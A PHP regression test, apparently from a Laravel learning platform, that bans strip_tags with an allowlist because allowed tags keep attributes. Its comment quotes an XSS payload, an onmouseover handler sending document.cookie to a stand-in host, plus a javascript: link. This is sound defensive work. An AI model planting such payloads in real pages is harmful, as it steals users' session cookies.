<?php

/**
 * `strip_tags($html, '<p><a>')` is not a sanitiser, and this repo has now
 * believed that it was twice.
 *
 * The function removes disallowed **tags** and keeps every **attribute** on
 * the ones it allows. So an allowlist of `<p>` lets through:
 *
 *     <p onmouseover="fetch('https://elsewhere/?c='+document.cookie)">Hello</p>
 *
 * and an allowlist of `<a>` lets through `<a href="javascript:…">`. It also
 * unwraps `<script>` rather than dropping it, leaving `alert(1)` as loose text
 * in the page — harmless, but a sign the function is doing something other
 * than what the caller thought.
 *
 * ## Twice, and the second one was written down
 *
 * `ValidateContentBlockDataAction` was fixed in #280, and the fix left a
 * comment in that file explaining exactly this. The comment stayed in that
 * file. `SaveCertificateTemplateAction` had the same line — allowlist
 * `<p><br><strong><em><h1><h2><h3><span>` — feeding
 * `documents/course-certificate.blade.php`, which renders it with
 * `{!! $body_html !!}` into an HTML document. Certificate templates are
 * writable by `course_creator` and certificates are opened by admins,
 * students and families.
 *
 * This is the third time a lesson in this codebase sat in one file while its
 * siblings had the same bug — compare `SoftDeletesSurviveRawReadsTest`, which
 * exists for the same reason. A comment is not a gate.
 *
 * ## What is checked
 *
 * `strip_tags()` with a **second argument** is banned. One-argument
 * `strip_tags()` is fine and common here: it means "give me the plain text",
 * for a meta description or a search index, and it has no allowlist to be
 * wrong about.
 */
it('never uses strip_tags as an HTML sanitiser', function () {
    $offenders = [];

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator(base_path('app'), FilesystemIterator::SKIP_DOTS)
    );

    foreach ($files as $file) {
        if (! $file->isFile() || $file->getExtension() !== 'php') {
            continue;
        }

        $source = stripPhpComments(file_get_contents($file->getPathname()));
        $path = str_replace(base_path().'/', '', $file->getPathname());

        if (! preg_match_all('/\bstrip_tags\s*\(/', $source, $matches, PREG_OFFSET_CAPTURE)) {
            continue;
        }

        foreach ($matches[0] as $match) {
            // Walk to the matching close paren, so a comma inside a nested
            // call or a string is not mistaken for a second argument.
            $i = $match[1] + strlen($match[0]);
            $depth = 1;
            $hasSecondArgument = false;

            for ($end = strlen($source); $i < $end && $depth > 0; $i++) {
                $char = $source[$i];

                if ($char === '(' || $char === '[') {
                    $depth++;
                } elseif ($char === ')' || $char === ']') {
                    $depth--;
                } elseif ($char === "'" || $char === '"') {
                    // Skip the string, escapes included.
                    $quote = $char;
                    for ($i++; $i < $end; $i++) {
                        if ($source[$i] === '\\') {
                            $i++;

                            continue;
                        }
                        if ($source[$i] === $quote) {
                            break;
                        }
                    }
                } elseif ($char === ',' && $depth === 1) {
                    $hasSecondArgument = true;
                }
            }

            if ($hasSecondArgument) {
                $offenders[] = $path.':'.(substr_count(substr($source, 0, $match[1]), "\n") + 1);
            }
        }
    }

    sort($offenders);

    expect($offenders)->toBeEmpty(
        "These pass an allowlist to strip_tags, which does not do what the allowlist suggests:\n  "
        .implode("\n  ", $offenders)
        ."\n\nstrip_tags keeps every attribute on the tags it allows, so `<p onclick>` "
        .'and `<a href="javascript:…">` survive. Use '
        .'App\\Support\\Html\\HtmlSanitizer::clean($html, PROFILE_CMS|PROFILE_LESSON) instead. '
        .'One-argument strip_tags — "give me the plain text" — is fine and is not flagged.'
    );
});
